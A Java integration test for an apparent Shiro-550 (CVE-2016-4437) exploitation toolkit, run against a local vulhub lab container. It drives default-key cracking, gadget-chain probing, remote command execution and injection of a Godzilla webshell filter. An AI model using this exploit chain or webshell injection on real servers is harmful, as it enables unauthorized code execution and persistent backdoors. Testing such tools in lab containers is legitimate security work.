package com.reajason.javaweb.integration.memshell.shiro;

import com.reajason.javaweb.packer.Packers;
import com.reajason.javaweb.shiroexploit.sdk.AesMode;
import com.reajason.javaweb.shiroexploit.sdk.CancelToken;
import com.reajason.javaweb.shiroexploit.sdk.ChainProbe;
import com.reajason.javaweb.shiroexploit.sdk.GadgetChain;
import com.reajason.javaweb.shiroexploit.sdk.KeyCanary;
import com.reajason.javaweb.shiroexploit.sdk.PayloadBuilder;
import com.reajason.javaweb.shiroexploit.sdk.ShiroBatchScanner;
import com.reajason.javaweb.shiroexploit.sdk.ShiroClient;
import com.reajason.javaweb.shiroexploit.sdk.ShiroDetector;
import com.reajason.javaweb.shiroexploit.sdk.ShiroDropper;
import com.reajason.javaweb.shiroexploit.sdk.ShiroExploitSession;
import com.reajason.javaweb.shiroexploit.sdk.ShiroInjector;
import com.reajason.javaweb.shiroexploit.sdk.ShiroKeyCracker;
import com.reajason.javaweb.shiroexploit.sdk.ShiroLogSink;
import com.reajason.javaweb.shiroexploit.sdk.ShiroTarget;
import com.reajason.javaweb.integration.ShellAssertion;
import com.reajason.javaweb.memshell.MemShellResult;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaConfig;
import com.reajason.javaweb.probe.ProbeShellGenerator;
import com.reajason.javaweb.probe.ProbeShellResult;
import com.reajason.javaweb.probe.config.ProbeConfig;
import com.reajason.javaweb.probe.config.SleepConfig;
import com.reajason.javaweb.probe.ProbeContent;
import com.reajason.javaweb.probe.ProbeMethod;
import lombok.extern.slf4j.Slf4j;
import net.bytebuddy.jar.asm.Opcodes;
import org.junit.jupiter.api.AfterAll;
import org.junit.jupiter.api.MethodOrderer;
import org.junit.jupiter.api.Order;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.TestMethodOrder;
import org.junit.jupiter.api.Timeout;
import org.testcontainers.containers.ComposeContainer;
import org.testcontainers.containers.wait.strategy.Wait;
import org.testcontainers.junit.jupiter.Container;
import org.testcontainers.junit.jupiter.Testcontainers;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.InputStream;
import java.time.Duration;
import java.util.Arrays;
import java.util.Collections;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.TimeUnit;

import static com.reajason.javaweb.integration.DoesNotContainExceptionMatcher.doesNotContainException;
import static org.hamcrest.MatcherAssert.assertThat;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertTrue;
import org.junit.jupiter.api.parallel.ResourceLock;

/**
 * CVE-2016-4437（Shiro-550 rememberMe 反序列化）真实靶标验收，对应 IMPLEMENTATION.md §6.3 验收矩阵。
 * 靶标 {@code vulhub/shiro:1.2.4}（Spring Boot fat jar + 内嵌 Tomcat，JDK 8u102，默认 Key，CBC）。
 *
 * <p>用例按序执行，前序产出（key/mode/chain/server）作为后续会话状态——与 GUI 里
 * 「探测 → 爆破 → 探链 → 识别 → 注入/命令」的人工流水线一一对应。
 *
 * <p>日志卫生（第 11 步）：Shiro 1.2.4 处理非法 rememberMe 时
 * {@code AbstractRememberMeManager} 只打 DEBUG 且重抛，真正留下 WARN 块（含 CCE 栈）的是
 * {@code DefaultSecurityManager} 的 {@code "threw an exception during getRememberedPrincipals()"}——
 * 每个 CB/CC 载荷请求恰好产出一块；装载器 flush 提交响应后，user 过滤器的 sendRedirect /
 * 会话创建还会衍生 "after the response has been committed" 噪音。断言前按日志条目（时间戳行起始）剥掉这两类预期块，
 * 再对剩余部分跑 {@code DoesNotContainExceptionMatcher}；顺带断言预期块数 ≥ 载荷请求数，
 * 证明载荷确实在目标上执行过。
 *
 * <p>关于 deleteMe 语义：探测/爆破请求（无装载器输出）的 deleteMe 计数照常可用；
 * 装载器一旦写回显就 flush 提交，deleteMe 挂不上——装载器响应的成败只看回显与 L3。
 * 另注意 shiro 过滤器是全站生效的：同应用任何路径（含 404）都过 rememberMe 处理，
 * 所以"不误报"的对照必须用另一个无 Shiro 的 HTTP 服务（compose 里的 nginx control）。
 */
// compose 文件写死宿主端口，同锁互斥避免并发启动端口冲突
@ResourceLock("fixed-port-compose")
@Testcontainers
@TestMethodOrder(MethodOrderer.OrderAnnotation.class)
@Timeout(value = 5, unit = TimeUnit.MINUTES)
@Slf4j
public class CVE20164437ContainerTest {

    /**
     * vulhub/shiro:1.2.4 的默认 rememberMe Key（公开靶标的出厂值，非秘密）
     */
    static final String DEFAULT_KEY = "kPH+bIxk5D2deZiIxcaaaA==";
    static final int SLEEP_SECONDS = 3;
    /**
     * 与 src/shiro-fixtures/java/shiro/fixture/ContainerMarker.java 同源，改一侧必须同步另一侧
     */
    static final String MARKER_PATH = "/tmp/cve-2016-4437-marker";

    @Container
    public static final ComposeContainer compose =
            new ComposeContainer(new File("docker-compose/cve/CVE-2016-4437-docker-compose.yml"))
                    // amd64 镜像在 Apple Silicon 上靠 emulation，启动慢属预期
                    .withExposedService("shiro", 8080, Wait.forHttp("/")
                            .forStatusCodeMatching(code -> code >= 200 && code < 400)
                            .withStartupTimeout(Duration.ofMinutes(3)))
                    .withExposedService("control", 80, Wait.forHttp("/"));

    static ShiroExploitSession session;
    /**
     * 带载荷请求数下限：每个 CB/CC 载荷请求必产出一块 DefaultSecurityManager WARN（CCE 栈），
     * 供 @AfterAll 日志断言"块数 ≥ 请求数"。只增不精确（爆破/探测里的坏 Key 请求同样产块但不计入），
     * 保持下界语义即可。
     */
    static int payloadRequests;

    static String baseUrl() {
        return "http://" + compose.getServiceHost("shiro", 8080) + ":" + compose.getServicePort("shiro", 8080);
    }

    static String controlUrl() {
        return "http://" + compose.getServiceHost("control", 80) + ":" + compose.getServicePort("control", 80);
    }

    static ShiroTarget target(String url) {
        // sleep 探测会把读超时自动放大到 sleep+5s，这里给足基础超时即可
        return ShiroTarget.builder(url).timeoutMillis(20000).build();
    }

    @Test
    @Order(1)
    void detectFindsShiroAndSkipsNonShiroPath() throws Exception {
        session = new ShiroExploitSession(target(baseUrl()), ShiroLogSink.stdout());
        ShiroDetector.DetectionResult detection = session.detect(new CancelToken());
        assertTrue(detection.shiro, "应判定存在 Shiro：" + detection);
        assertTrue(detection.crackAllowed(), "flagCount>0 才允许基于 countDeleteMe 的爆破");
        assertEquals(1, detection.flagCount, "单个 Shiro 过滤器，垃圾 Cookie 应恰好回一个 deleteMe");

        // 对照必须是另一个无 Shiro 的活 HTTP 服务：shiro 过滤器全站生效，
        // 同应用哪怕 404 路径也会带 deleteMe（那是正确判定，不是误报）
        ShiroDetector.DetectionResult negative = new ShiroDetector(
                target(controlUrl()), ShiroLogSink.noop()).detect(new CancelToken());
        assertFalse(negative.shiro, "无 Shiro 的 nginx 对照不应误报：" + negative);
    }

    @Test
    @Order(2)
    void crackFindsDefaultKeyInCbcMode() {
        String garbageKey = java.util.Base64.getEncoder().encodeToString(new byte[16]);
        ShiroKeyCracker.CrackResult result = session.crack(
                Arrays.asList(garbageKey, DEFAULT_KEY), AesMode.AUTO, 2, 0, new CancelToken());
        assertTrue(result.found, "小字典应命中默认 Key");
        assertEquals(DEFAULT_KEY, result.key);
        assertEquals(AesMode.CBC, result.mode, "Shiro 1.2.4 是 CBC");
        assertEquals(DEFAULT_KEY, session.getKey(), "命中后 Key 应自动写入会话");
    }

    @Test
    @Order(3)
    void chainProbeHitsCb19AndCc3ButNotCb18() throws Exception {
        ChainProbe probe = new ChainProbe(target(baseUrl()), session.getKey(), session.getAesMode(),
                ShiroLogSink.stdout());
        // 命中 = 探测 + 复核共 2 个载荷请求；未命中 = 1 个（基线请求不带 Cookie，不产 WARN）
        assertNull(probe.probeChain(Collections.singletonList(GadgetChain.byName(Packers.JavaCommonsBeanutils18)),
                SLEEP_SECONDS, new CancelToken()), "CB18 档不应命中（靶标 beanutils 1.9.2，UID 不匹配）");
        payloadRequests += 1;
        assertEquals(Packers.JavaCommonsBeanutils19, probe.probeChain(
                        Collections.singletonList(GadgetChain.byName(Packers.JavaCommonsBeanutils19)),
                        SLEEP_SECONDS, new CancelToken()).getName(), "CB19 档应延时命中");
        payloadRequests += 2;
        assertEquals(Packers.JavaCommonsCollections3, probe.probeChain(
                        Collections.singletonList(GadgetChain.byName(Packers.JavaCommonsCollections3)),
                        SLEEP_SECONDS, new CancelToken()).getName(), "CC3 档应延时命中（靶标 collections 3.2.1）");
        payloadRequests += 2;
    }

    @Test
    @Order(4)
    void sessionProbeSetsChainAndIdentifiesTomcatViaDropper() throws Exception {
        session.setSleepSeconds(SLEEP_SECONDS);
        ChainProbe.ProbeResult result = session.probe(new CancelToken());
        assertTrue(result.chainFound(), "L2a 应有链命中：" + result);
        assertTrue(result.serverFound(), "L2b 应识别 server：" + result);
        assertEquals("Tomcat", result.server);
        assertEquals("DROPPER", result.serverConfirmedBy,
                "装载器单发 cmd=echo <nonce> 应命中——顺带实证请求定位在真实 Shiro 过滤器里可用");
        assertEquals("Tomcat", session.getServer(), "命中后 server 应自动写入会话");
        // 全量候选：7 链各 1 请求 + 命中链复核 1 + L2b 装载器单发（Tomcat 是首个候选）1
        payloadRequests += 9;
    }

    @Test
    @Order(5)
    void sleepServerQuizFallbackSleepsOnlyOnMatch() throws Exception {
        // L2b 主路径已由 Order(4) 锁定 DROPPER；这里回归兜底 quiz 的命中语义（对齐假 Shiro 回环的做法）
        String hitCookie = sleepServerQuizCookie("Tomcat");
        long start = System.currentTimeMillis();
        ShiroClient.send(target(baseUrl()), hitCookie, new CancelToken());
        long elapsed = System.currentTimeMillis() - start;
        assertTrue(elapsed >= SLEEP_SECONDS * 1000L, "Tomcat quiz 应延时，实际 " + elapsed + "ms");
        payloadRequests++;

        String missCookie = sleepServerQuizCookie("Jetty");
        start = System.currentTimeMillis();
        ShiroClient.send(target(baseUrl()), missCookie, new CancelToken());
        elapsed = System.currentTimeMillis() - start;
        assertTrue(elapsed < SLEEP_SECONDS * 1000L, "Jetty quiz 在 Tomcat 目标上不应命中，实际 " + elapsed + "ms");
        payloadRequests++;
    }

    @Test
    @Order(6)
    void commandExecRoundTripAndDropperCookieReuse() throws Exception {
        String id = session.exec("id", new CancelToken());
        assertNotNull(id, "exec 应按 nonce 抠取回显");
        assertTrue(id.contains("uid="), "id 输出：" + id);

        String echo = session.exec("echo a b | cat", new CancelToken());
        assertNotNull(echo);
        assertTrue(echo.contains("a b"), "含空格/管道的命令不应被顶回，输出：" + echo);

        String noOutput = session.exec("true", new CancelToken());
        assertTrue(noOutput == null || (!noOutput.contains("Exception") && !noOutput.contains("\tat ")),
                "无输出命令不应回显栈回溯：" + noOutput);

        assertEquals(1, session.getDropperGenerationCount(),
                "三次 exec 应复用同一个装载器 Cookie（载荷生成计数器 = 1）");
        payloadRequests += 3;
    }

    @Test
    @Order(7)
    void godzillaFilterInjectedViaDropperAndReachable() throws Exception {
        Map<String, String> params = new HashMap<String, String>();
        params.put("pass", "pass");
        params.put("key", "key");
        MemShellResult shell = PayloadBuilder.generate("Tomcat", "Filter", "Godzilla", "/*", params);
        assertTrue(shell.getInjectorBytes().length > 8192,
                "Godzilla Filter injector 必然超 8KB——body 通道正是为它存在，实际 "
                        + shell.getInjectorBytes().length);

        ShiroInjector.InjectResult result = session.inject(shell, session.getChain(), new CancelToken());
        payloadRequests++;
        assertEquals(200, result.statusCode, result.toString());
        assertTrue(result.echoReceived, "装载器回显应出现（injector msg 在 nonce 内）：" + result);
        assertFalse(result.deleteMePresent,
                "装载器 flush 提交响应后 deleteMe 挂不上——deleteMe 语义由探测/爆破请求承载，装载器只看回显/L3");
        assertTrue(result.cookieValueBytes <= ShiroDropper.COOKIE_LIMIT_WITH_CMD,
                "装载器 Cookie 必须在红线内：" + result.cookieValueBytes);
        assertEquals(1, session.getDropperGenerationCount(), "注入与命令共用同一个装载器");

        // L3 真验证：Godzilla 客户端直连（filter 挂在 /*，任意路径都过它）
        ShellAssertion.godzillaIsOk(baseUrl() + "/test", (GodzillaConfig) shell.getShellToolConfig());
    }

    @Test
    @Order(8)
    void customSerializedCanaryDeserializesCleanly() throws Exception {
        // F22-A：canary 是合法 Shiro 主体而非 gadget——解密+反序列化正常完成 → 响应不带 deleteMe
        //（与 detect 里"垃圾 Cookie 必带 deleteMe"互为反证）。本靶标 `/** = user`，空主体集合
        // 不算已登录 → 302 属预期，状态码不参与断言。不产生 WARN 块，不计入 payloadRequests。
        ShiroInjector.InjectResult result = session.injectCustomSerialized(KeyCanary.CANARY_BASE64, new CancelToken());
        assertFalse(result.deleteMePresent, "canary 反序列化成功，响应不应带 deleteMe：" + result);
    }

    @Test
    @Order(9)
    void customClassRunsConstructorOnTarget() throws Exception {
        // F22-B：裸 class 走装载器 body——构造器在目标容器里写标记文件，命令通道读回
        byte[] classBytes = readFixtureBytes("/shiro/fixture/ContainerMarker.class");
        ShiroInjector.InjectResult result = session.injectCustomClass(classBytes, session.getChain(), new CancelToken());
        payloadRequests++;
        assertEquals(200, result.statusCode, result.toString());

        String out = session.exec("cat " + MARKER_PATH, new CancelToken());
        payloadRequests++;
        assertNotNull(out);
        assertTrue(out.contains("ran"), "标记文件应已在容器内生成，cat 输出：" + out);
    }

    @Test
    @Order(10)
    void batchScanAggregatesHitsAndSkipsNonShiro() {
        ShiroBatchScanner.BatchOptions options = new ShiroBatchScanner.BatchOptions();
        options.concurrency = 2;
        options.crackKeys = true;
        options.keys = Collections.singletonList(DEFAULT_KEY);
        options.crackThreads = 1;
        String nonShiroUrl = controlUrl();
        ShiroBatchScanner.BatchResult result = new ShiroBatchScanner(target(baseUrl()), ShiroLogSink.stdout())
                .scan(Arrays.asList(baseUrl(), nonShiroUrl), options, new CancelToken(), null);

        assertEquals(2, result.items.size());
        ShiroBatchScanner.BatchItem hit = itemByUrl(result, baseUrl());
        assertNotNull(hit, "正例行缺失");
        assertTrue(hit.shiro, "正例行应命中 Shiro");
        assertTrue(hit.keyFound, "正例行应顺带爆出 Key");
        assertEquals(DEFAULT_KEY, hit.key);
        ShiroBatchScanner.BatchItem miss = itemByUrl(result, nonShiroUrl);
        assertNotNull(miss, "对照行缺失");
        assertFalse(miss.shiro, "对照行不应误报");
        assertFalse(miss.keyFound);
        assertEquals(1, result.shiroCount());
        assertTrue(result.peakConcurrency >= 1 && result.peakConcurrency <= 2,
                "峰值并发应 ≤ 执行器并发上限：" + result.peakConcurrency);
    }

    @AfterAll
    static void containerLogsStayCleanOutsideExpectedRememberMeWarnings() {
        String logs = compose.getContainerByServiceName("shiro").get().getLogs();
        // Spring Boot 日志条目以时间戳行起始；栈行挂在所属条目里一起剥离
        String[] entries = logs.split("(?m)(?=^\\d{4}-\\d{2}-\\d{2} \\d{2}:\\d{2}:\\d{2})");
        int rememberMeBlocks = 0;
        StringBuilder rest = new StringBuilder();
        for (String entry : entries) {
            // Shiro 1.2.4 的预期告警：DefaultSecurityManager WARN「…threw an exception during
            // getRememberedPrincipals().」+ CCE/反序列化栈——每个载荷请求恰好一块
            if (entry.contains("threw an exception during getRememberedPrincipals()")) {
                rememberMeBlocks++;
                continue;
            }
            // 装载器 flush 提交响应后，后续过滤器/业务再碰会话/重定向都会撞
            // "... after the response has been committed"（sendRedirect、create session 等变体），不是失败信号
            if (entry.contains("the response has been committed")) {
                continue;
            }
            rest.append(entry);
        }
        log.info("expected rememberMe WARN blocks: {}, payload requests (lower bound): {}",
                rememberMeBlocks, payloadRequests);
        assertTrue(rememberMeBlocks >= payloadRequests,
                "预期 CCE 告警块数（" + rememberMeBlocks + "）应 ≥ 载荷请求数（" + payloadRequests
                        + "），否则说明有载荷没真正在目标上执行");
        assertThat("剥离预期 rememberMe 告警块后不应再有其它异常", rest.toString(), doesNotContainException());
    }

    private static String sleepServerQuizCookie(String server) {
        ProbeConfig probeConfig = ProbeConfig.builder()
                .probeMethod(ProbeMethod.Sleep)
                .probeContent(ProbeContent.Server)
                .targetJreVersion(Opcodes.V1_8)
                .shrink(true)
                .build();
        ProbeShellResult quiz = ProbeShellGenerator.generate(probeConfig,
                SleepConfig.builder().server(server).seconds(SLEEP_SECONDS).build());
        return PayloadBuilder.toCookieValue(session.getKey(), session.getAesMode(),
                quiz.getShellBytes(), session.getChain());
    }

    private static ShiroBatchScanner.BatchItem itemByUrl(ShiroBatchScanner.BatchResult result, String url) {
        for (ShiroBatchScanner.BatchItem item : result.items) {
            if (url.equals(item.url)) {
                return item;
            }
        }
        return null;
    }

    private static byte[] readFixtureBytes(String resource) throws Exception {
        try (InputStream in = CVE20164437ContainerTest.class.getResourceAsStream(resource)) {
            assertNotNull(in, "fixture class bytes not found: " + resource
                    + "（compileShiroExploitFixtures 任务应已把它编进测试运行期 classpath）");
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            byte[] buf = new byte[4096];
            int n;
            while ((n = in.read(buf)) != -1) {
                out.write(buf, 0, n);
            }
            return out.toByteArray();
        }
    }
}
